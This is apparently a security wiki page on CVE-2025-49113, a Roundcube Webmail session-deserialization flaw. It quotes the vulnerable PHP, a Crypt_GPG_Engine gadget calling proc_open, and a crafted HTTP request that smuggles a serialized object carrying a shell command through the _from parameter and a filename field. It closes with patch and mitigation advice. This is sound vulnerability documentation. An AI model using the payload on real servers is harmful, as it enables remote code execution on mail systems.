# Roundcube Webmail Session Deserialization (CVE-2025-49113)

{{#include ../../banners/hacktricks-training.md}}

## Overview

Post-authenticated remote code execution in Roundcube Webmail versions <1.5.10 and 1.6.0–1.6.10 via unsanitized `_from` parameter leading to PHP object deserialization in session storage.

## Vulnerable Code

The upload handler in `program/actions/settings/upload.php` retrieves the `_from` GET parameter without strict validation and uses it to build session keys:

```php
$from = rcube_utils::get_input_string('_from', rcube_utils::INPUT_GET);
$type = preg_replace('/(add|edit)-/', '', $from);
// sanitize dot to avoid session path issues
$type = str_replace('.', '-', $type);
...
$rcmail->session->append($type . '.files', $id, $attachment);
```

The `append()` method triggers a `reload()` after 0.5 seconds, invoking `session_decode()` on attacker-controlled session data.

## Custom Session Serialization Bug

Roundcube overrides PHP’s `serialize()` and `unserialize()` for session data, splitting entries on the `|` character. The `unserialize()` implementation misinterprets `!` prefixes, allowing injection of serialized objects into session storage:

```php
protected function serialize($vars) { /* custom serializer splitting on '|' */ }

public static function unserialize($str) {
    // custom parser treats '!' prefix to skip values
    if ($str[$p] == '!') {
        $p++;
        $has_value = false;
    } else {
        $has_value = true;
    }
    // improper parsing leads to session corruption
}
```

## Gadget Chain & RCE

A gadget in `Crypt_GPG_Engine` abuses its private `$_gpgconf` property to execute shell commands via `proc_open()`:

```php
class Crypt_GPG_Engine {
    private $_gpgconf;
    function __construct($cmd) { $this->_gpgconf = $cmd; }
    private function _closeIdleAgents() {
        if ($this->_gpgconf && is_executable($this->_gpgconf)) {
            $env = ['GNUPGHOME' => $this->_homedir];
            $cmd = $this->_gpgconf . ' --kill gpg-agent';
            proc_open($cmd, [], $pipes, null, $env);
        }
    }
}
```

## Exploitation

The serialized payload is split between the URL `_from` parameter (injecting into the session key) and the multipart `filename` field (completing the serialized value):

```http
POST /?_from=edit-!";i:0;O:16:"Crypt_GPG_Engine":1:{S:26:"\0Crypt_GPG_Engine\0_gpgconf";S:18:"touch+/tmp/pwned;#";}i:0;b:0;}" ...
Content-Disposition: form-data; name="_file[]"; filename="x|b:0;preferences_time|b:0;preferences|s:179:\"a:3:{i:0;s:57:\".png"
```

Upon `reload()`, `session_decode()` merges the data, instantiating the gadget and triggering code execution.

## Mitigation

- Upgrade to Roundcube ≥1.5.10 or ≥1.6.11.
- Apply patch [0376f69](https://github.com/roundcube/roundcubemail/commit/0376f69e958a8fef7f6f09e352c541b4e7729c4d) enforcing `rcube_utils::is_simple_string()` on `_from`.
- Restrict session storage and apply least privilege to the web server user.
- Audit and patch any bundled Roundcube installations.

### References

{{#ref}}
https://www.offsec.com/blog/cve-2025-49113/
https://github.com/fearsoff-org/CVE-2025-49113
https://fearsoff.org/research/roundcube
https://github.com/roundcube/roundcubemail/commit/0376f69e958a8fef7f6f09e352c541b4e7729c4d
https://nvd.nist.gov/vuln/detail/CVE-2025-49113
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}